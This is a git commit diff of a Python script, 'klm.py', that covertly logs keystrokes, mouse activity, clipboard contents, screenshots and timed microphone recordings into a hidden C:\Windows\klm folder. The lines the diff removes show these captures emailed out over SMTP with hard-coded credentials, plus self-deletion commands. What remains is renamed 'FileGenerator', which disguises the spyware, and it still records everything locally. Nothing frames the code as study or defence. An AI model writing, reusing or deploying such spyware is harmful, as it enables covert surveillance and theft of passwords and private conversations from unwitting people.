6325ba5c406b897591ffa33f9679613361113955
chakibarrama <chakibarrama@gmail.com>
2024-05-15 00:34:02 +0100

    Update klm.py

--- klm.py
+++ klm.py
@@ -1,47 +1,36 @@
 import logging
 import os
 import platform
-import smtplib
 import socket
-import threading
+import time
 import wave
 import pyscreenshot
 import sounddevice as sd
 import pyperclip
 from pynput import keyboard
 from pynput.keyboard import Listener
-from email import encoders
-from email.mime.base import MIMEBase
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-import glob
-import time
-import tempfile
+import threading
 import math
 
 # Set up logging
 log_directory = "C:\\Windows\\klm\\logs"
+output_directory = "C:\\Windows\\klm\\output"
 os.makedirs(log_directory, exist_ok=True)
-logging.basicConfig(filename=os.path.join(log_directory, 'keylogger.log'),
+os.makedirs(output_directory, exist_ok=True)
+logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'),
                     level=logging.DEBUG,
                     format='%(asctime)s - %(levelname)s - %(message)s')
 
 VERSION = "1.0.2"
-EMAIL_ADDRESS = "071bfafc4dde91"
-EMAIL_PASSWORD = "9918ecc6a25877"
-SEND_REPORT_EVERY = 90  # as in seconds
 MICROPHONE_INTERVAL = 4500  # 1 hour and 15 minutes in seconds
 MICROPHONE_DURATION = 30  # 3 minutes in seconds
 MAX_ATTACHMENT_SIZE = 7 * 1024 * 1024  # 7 MB
 KLM_DIRECTORY = "C:\\Windows\\klm"
 
-class KeyLogger:
-    def __init__(self, time_interval, email, password):
-        self.interval = time_interval
-        self.log = "KeyLogger Started..."
-        self.email = email
-        self.password = password
-        logging.info("KeyLogger initialized")
+class FileGenerator:
+    def __init__(self):
+        self.log = "File Generation Started..."
+        logging.info("FileGenerator initialized")
 
     def appendlog(self, string):
         self.log += string
@@ -70,62 +59,13 @@ class KeyLogger:
                 current_key = " " + str(key) + " "
 
         self.appendlog(current_key + "\n")
+        self.save_log()
 
-    def send_mail(self, email, password, subject, message, attachment_paths=None):
-        try:
-            msg = MIMEMultipart()
-            msg['From'] = email
-            msg['To'] = email
-            msg['Subject'] = subject
-
-            msg.attach(MIMEText(message, 'plain'))
-
-            if attachment_paths:
-                for attachment_path in attachment_paths:
-                    if attachment_path and os.path.exists(attachment_path):
-                        with open(attachment_path, "rb") as attachment:
-                            part = MIMEBase('application', 'octet-stream')
-                            part.set_payload(attachment.read())
-                            encoders.encode_base64(part)
-                            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
-                            msg.attach(part)
-
-            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-                server.login(email, password)
-                server.sendmail(email, email, msg.as_string())
-
-            logging.info(f"Email sent successfully with subject: {subject}")
-
-            # Delete the files after sending
-            if attachment_paths:
-                for attachment_path in attachment_paths:
-                    if os.path.exists(attachment_path):
-                        os.remove(attachment_path)
-
-        except Exception as e:
-            logging.error(f"Failed to send email: {e}")
-            os._exit(1)
-
-    def report(self):
-        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-        self.appendlog("\nClipboard content: " + self.get_clipboard_content() + "\n")
-        screenshot_path = self.screenshot()
-        subject = f"Keylogger Report v{VERSION} - {timestamp}"
-        self.send_mail(self.email, self.password, subject, "\n\n" + self.log, [screenshot_path])
-        self.log = ""
-        timer = threading.Timer(self.interval, self.report)
-        timer.daemon = True
-        timer.start()
-
-    def microphone_report(self):
-        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-        audio_paths = self.microphone()
-        for audio_path in audio_paths:
-            subject = f"Microphone Recording v{VERSION} - {timestamp}"
-            self.send_mail(self.email, self.password, subject, "Microphone recording", [audio_path])
-        mic_timer = threading.Timer(MICROPHONE_INTERVAL, self.microphone_report)
-        mic_timer.daemon = True
-        mic_timer.start()
+    def save_log(self):
+        log_path = os.path.join(output_directory, "key_log.txt")
+        with open(log_path, 'w') as log_file:
+            log_file.write(self.log)
+        logging.info(f"Key log saved to {log_path}")
 
     def get_clipboard_content(self, max_retries=5):
         for i in range(max_retries):
@@ -147,12 +87,13 @@ class KeyLogger:
         self.appendlog("Processor: {}\n".format(plat))
         self.appendlog("System: {}\n".format(system))
         self.appendlog("Machine: {}\n".format(machine))
+        self.save_log()
 
     def microphone(self):
         try:
             fs = 44100  # Sample rate
             seconds = MICROPHONE_DURATION  # Duration of recording
-            audio_path = os.path.join(KLM_DIRECTORY, "audio_log.wav")
+            audio_path = os.path.join(output_directory, "audio_log.wav")
 
             myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
             sd.wait()  # Wait until recording is finished
@@ -168,15 +109,14 @@ class KeyLogger:
             logging.info(f"Recorded audio size: {audio_size} bytes")
             if audio_size > MAX_ATTACHMENT_SIZE:
                 logging.info("Splitting audio file due to size")
-                return self.split_audio_file(audio_path)
-            return [audio_path]
+                self.split_audio_file(audio_path)
+            else:
+                logging.info(f"Audio file saved to {audio_path}")
         except Exception as e:
             self.appendlog(f"Failed to record audio: {e}\n")
             logging.error(f"Failed to record audio: {e}")
-            return []
 
     def split_audio_file(self, audio_path):
-        chunks = []
         chunk_size = MAX_ATTACHMENT_SIZE - 1024 * 1024  # 6 MB
         with wave.open(audio_path, 'rb') as wf:
             params = wf.getparams()
@@ -185,35 +125,36 @@ class KeyLogger:
             num_chunks = math.ceil(total_frames / frames_per_chunk)
 
             for i in range(num_chunks):
-                chunk_path = os.path.join(KLM_DIRECTORY, f"audio_log_part_{i+1}.wav")
+                chunk_path = os.path.join(output_directory, f"audio_log_part_{i+1}.wav")
                 with wave.open(chunk_path, 'wb') as chunk_wf:
                     chunk_wf.setparams(params)
                     frames = wf.readframes(frames_per_chunk)
                     chunk_wf.writeframes(frames)
-                chunks.append(chunk_path)
                 logging.info(f"Created audio chunk: {chunk_path} with size: {os.path.getsize(chunk_path)} bytes")
         os.remove(audio_path)  # Delete the original file after splitting
-        return chunks
 
     def screenshot(self):
         try:
             img = pyscreenshot.grab()
-            # Save screenshot in the user's temporary directory
-            screenshot_path = os.path.join(KLM_DIRECTORY, "screenshot.png")
+            # Save screenshot in the output directory
+            screenshot_path = os.path.join(output_directory, "screenshot.png")
             img.save(screenshot_path)
             logging.info(f"Screenshot saved to {screenshot_path}")
-            return screenshot_path
         except Exception as e:
             self.appendlog("Failed to take screenshot: {}\n".format(e))
             logging.error(f"Failed to take screenshot: {e}")
-            return None
 
     def run(self):
-        # Start the regular report timer
-        self.report()
-
         # Start the microphone report timer
-        self.microphone_report()
+        mic_timer = threading.Timer(MICROPHONE_INTERVAL, self.microphone)
+        mic_timer.daemon = True
+        mic_timer.start()
+
+        # Take a screenshot initially
+        self.screenshot()
+
+        # Capture system information
+        self.system_information()
 
         # Start the keyboard listener
         keyboard_listener = keyboard.Listener(on_press=self.save_data)
@@ -221,25 +162,6 @@ class KeyLogger:
             keyboard_listener.join()
         with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
             mouse_listener.join()
-        if os.name == "nt":
-            try:
-                pwd = os.path.abspath(os.getcwd())
-                os.system("cd " + pwd)
-                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-                print('File was closed.')
-                os.system("DEL " + os.path.basename(__file__))
-            except OSError:
-                print('File is close.')
-        else:
-            try:
-                pwd = os.path.abspath(os.getcwd())
-                os.system("cd " + pwd)
-                os.system('pkill leafpad')
-                os.system("chattr -i " + os.path.basename(__file__))
-                print('File was closed.')
-                os.system("rm -rf " + os.path.basename(__file__))
-            except OSError:
-                print('File is close.')
 
-keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
-keylogger.run()
+file_generator = FileGenerator()
+file_generator.run()
